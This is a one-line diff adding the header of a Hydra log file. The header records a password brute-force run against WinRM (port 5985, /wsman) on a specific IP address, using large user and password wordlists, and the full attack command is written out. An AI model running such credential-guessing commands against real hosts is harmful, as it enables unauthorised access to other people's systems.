@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-07-28 06:33:59 on 103.24.230.93 http-head (hydra -L /tmp/big_users.txt -P /tmp/big_pass.txt -t 4 -w 3 -o /tmp/wrm2.txt http-head://103.24.230.93:5985/wsman)
